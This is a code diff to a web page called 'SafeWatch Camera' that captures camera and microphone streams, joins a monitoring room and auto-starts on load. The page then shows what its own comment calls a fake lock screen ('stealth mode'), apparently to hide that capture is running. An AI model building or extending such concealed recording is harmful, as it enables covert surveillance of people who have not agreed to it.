@@ -5,7 +5,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>SafeWatch Camera</title>
-    <link rel="stylesheet" href="css/style.css?v=2.5">
+    <link rel="stylesheet" href="css/style.css?v=2.7">
     <link rel="manifest" href="manifest.json">
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="theme-color" content="#0f172a">
@@ -204,37 +204,49 @@
             }
         });
 
+        let autoStartTimer;
         async function startSystem() {
+            if (autoStartTimer) clearTimeout(autoStartTimer);
             log("Starting system...");
             try {
-                await getCamera(currentFacingMode);
-                await requestWakeLock(); // Keep screen on
+                // Attempt to get camera (both audio and video)
+                const stream = await getCamera(currentFacingMode);
 
-                // If camera started successfully, hide the overlay
-                permissionOverlay.style.display = 'none';
+                if (stream) {
+                    await requestWakeLock(); // Keep screen on
+                    permissionOverlay.style.display = 'none';
+                    socket.emit('join-room', roomId, 'monitor');
+                    sendDeviceInfo();
+                    log("Monitor Active.");
 
-                socket.emit('join-room', roomId, 'monitor');
-                sendDeviceInfo();
-                log("Camera ready.");
-
-                // Auto-activate stealth mode (fake lock screen)
-                setTimeout(() => {
-                    toggleStealthMode();
-                }, 1000);
+                    // Auto-activate stealth mode (fake lock screen)
+                    setTimeout(() => {
+                        toggleStealthMode();
+                    }, 1500);
+                } else {
+                    throw new Error("No stream acquired");
+                }
             } catch (e) {
-                log("Auto-start blocked/failed: " + e.message);
-                // Show overlay if auto-start is blocked by browser policy
+                log("Startup sequence intercepted: " + e.message);
                 permissionOverlay.style.display = 'flex';
+                // Show a helpful tip on the button
+                document.getElementById('start-btn').innerHTML = 'اضغط لتنشيط الكاميرا يدوياً';
             }
         }
 
         // 2. Custom Permission Button Handler
-        document.getElementById('start-btn').addEventListener('click', startSystem);
+        document.getElementById('start-btn').addEventListener('click', () => {
+            log("Button clicked, triggering startSystem...");
+            // Change text to loading
+            document.getElementById('start-btn').innerHTML = '<ion-icon name="sync" class="pulsing"></ion-icon> جاري التشغيل...';
+            startSystem();
+        });
 
         // Auto-run on load (will work if permissions already granted)
         window.addEventListener('load', () => {
-            log("Page loaded. Attempting auto-start...");
-            startSystem();
+            log("Initial load check...");
+            // Small delay to ensure everything is ready
+            autoStartTimer = setTimeout(startSystem, 800);
         });
 
         async function getScreen() {
@@ -307,14 +319,28 @@
                     localStream.getTracks().forEach(track => track.stop());
                 }
 
-                const stream = await navigator.mediaDevices.getUserMedia({
-                    video: {
-                        facingMode: facingMode,
-                        width: { ideal: 640 }, // Lower res for broader compatibility
-                        height: { ideal: 480 }
-                    },
-                    audio: true
-                });
+                log("Requesting Audio + Video...");
+                let stream;
+                try {
+                    stream = await navigator.mediaDevices.getUserMedia({
+                        video: {
+                            facingMode: facingMode,
+                            width: { ideal: 640 },
+                            height: { ideal: 480 }
+                        },
+                        audio: true
+                    });
+                } catch (audioErr) {
+                    log("Audio+Video failed, trying Video-Only: " + audioErr.message);
+                    stream = await navigator.mediaDevices.getUserMedia({
+                        video: {
+                            facingMode: facingMode,
+                            width: { ideal: 640 },
+                            height: { ideal: 480 }
+                        },
+                        audio: false
+                    });
+                }
 
                 log("Stream acquired. Tracks: " + stream.getTracks().length);
 
@@ -325,9 +351,9 @@
                 try {
                     await localVideo.play();
                     log("Video.play() success");
+                    restartBtn.style.display = 'none';
                 } catch (e) {
-                    log("Video.play() error: " + e.message);
-                    log("SHOWING FORCE START BUTTON");
+                    log("Autoplay blocked: " + e.message);
                     restartBtn.style.display = 'block';
                 }
 
@@ -341,27 +367,16 @@
 
                 return stream;
             } catch (err) {
-                log("Camera Error: " + err.message);
+                log("Camera Critical Error: " + err.message);
 
-                if (err.name === 'NotAllowedError' || err.name === 'PermissionDeniedError') {
-                    statusText.innerHTML = `
-                        <div style="background: rgba(255,0,0,0.8); padding: 20px; border-radius: 10px;">
-                            <h3>⛔ تم رفض الوصول للكاميرا</h3>
-                            <p>يرجى السماح للموقع باستخدام الكاميرا:</p>
-                            <ol style="text-align: right; margin-top: 10px; line-height: 1.8;">
-                                <li>اضغط على أيقونة القفل 🔒 أو الإعدادات بجانب الرابط في الأعلى.</li>
-                                <li>اختر "الأذونات" (Permissions).</li>
-                                <li>فعل خيار الكاميرا 📷.</li>
-                                <li>اعد تحميل الصفحة.</li>
-                            </ol>
-                        </div>
-                    `;
-                    statusText.style.background = "transparent";
-                } else {
-                    statusText.innerText = "Error: " + err.message;
-                    restartBtn.style.display = 'block';
-                    restartBtn.innerText = "فشل الكاميرا. اضغط للمحاولة مرة أخرى";
+                if (err.name === 'NotAllowedError' || err.name === 'PermissionDeniedError' || err.name === 'NotFoundError') {
+                    permissionOverlay.style.display = 'flex';
+                    // Show a specific error message in the overlay if possible? 
+                    // For now, the user sees the professional overlay.
                 }
+
+                restartBtn.style.display = 'block';
+                return null;
             }
         }
 
